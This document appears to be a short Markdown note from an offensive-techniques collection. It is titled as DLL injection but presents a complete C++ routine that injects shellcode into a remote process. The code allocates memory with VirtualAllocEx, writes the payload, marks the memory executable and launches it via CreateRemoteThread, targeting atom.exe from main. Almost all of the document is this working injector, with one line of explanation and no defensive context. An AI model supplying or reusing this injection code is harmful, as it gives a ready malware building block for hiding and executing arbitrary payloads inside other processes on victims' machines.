## DLL-injection on a remote process

### Process enumeration [@LINK](./EnumerationProcess.md)

Simply, a C++ concept, loading link-libs at runtime in remote process.

The Shellcode is placed on a thread and executed via `CreateRemoteThread` within the remote process.

```cpp
// Main method

#include <windows.h>
#include <string>
#include <iostream>

bool InjectShellcodeToRemoteProcess(HANDLE hProcess, const BYTE* pShellcode, SIZE_T sSizeOfShellcode) {
    if (hProcess == nullptr || hProcess == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] Invalid process handle.\n";
        return false;
    }
    if (pShellcode == nullptr || sSizeOfShellcode == 0) {
        std::cerr << "[!] Invalid shellcode or size.\n";
        return false;
    }

    LPVOID pShellcodeAddress = nullptr;
    SIZE_T bytesWritten = 0;
    DWORD dwOldProtection = 0;
    HANDLE hThread = nullptr;

    pShellcodeAddress = VirtualAllocEx(hProcess, nullptr, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == nullptr) {
        std::cerr << "[!] VirtualAllocEx failed with error: " << GetLastError() << '\n';
        return false;
    }
    std::cout << "[i] Allocated memory at: " << pShellcodeAddress << '\n';

    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &bytesWritten) || bytesWritten != sSizeOfShellcode) {
        std::cerr << "[!] WriteProcessMemory failed with error: " << GetLastError() << '\n';
        VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
        return false;
    }
    std::cout << "[i] Successfully written " << bytesWritten << " bytes\n";

    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        std::cerr << "[!] VirtualProtectEx failed with error: " << GetLastError() << '\n';
        VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
        return false;
    }

	DWORD threadId = 0;

    hThread = CreateRemoteThread(
        hProcess,
        nullptr,
        0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(pShellcodeAddress),
        nullptr,
        0,
        &threadId
    );

    if (hThread == nullptr) {
        std::cerr << "[!] CreateRemoteThread failed with error: " << GetLastError() << '\n';
        DWORD dummy;
        VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, dwOldProtection, &dummy);
        VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
        return false;
    }

	std::cout << "[+] Thread created with ID:" << threadId;
    
    auto threadCloser = [](HANDLE h) { if (h) CloseHandle(h); };
    std::unique_ptr<void, decltype(threadCloser)> threadGuard(hThread, threadCloser);

    std::cout << "[i] Executing payload ...\n";

    DWORD waitResult = WaitForSingleObject(hThread, 10000); // 10s
    if (waitResult == WAIT_FAILED) {
        std::cerr << "[!] WaitForSingleObject failed with error: " << GetLastError() << '\n';
    } else if (waitResult == WAIT_TIMEOUT) {
        std::cout << "[i] Remote thread did not finish within timeout (10s). Continuing.\n";
    } else {
        std::cout << "[+] Remote thread finished.\n";
    }

    DWORD dummy;
    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, dwOldProtection, &dummy)) {
        std::cerr << "[!] VirtualProtectEx(restore) failed with error: " << GetLastError() << '\n';
    }
    
    if (!VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE)) {
        std::cerr << "[!] VirtualFreeEx failed with error: " << GetLastError() << '\n';
    }

    return true;
}

// process enum code & payload...

int main(int argc, char* argv[]) {
	// PrintProcesses();
	DWORD pdwPid;
	HANDLE phProcess;
	LPCWSTR pname = L"atom.exe";
	GetRemoteProcessHandle(pname, &pdwPid, &phProcess );
    
    InjectShellcodeToRemoteProcess(phProcess, &Payload, sizeof(Payload));
    std::cin.get();

    return 0;
}

```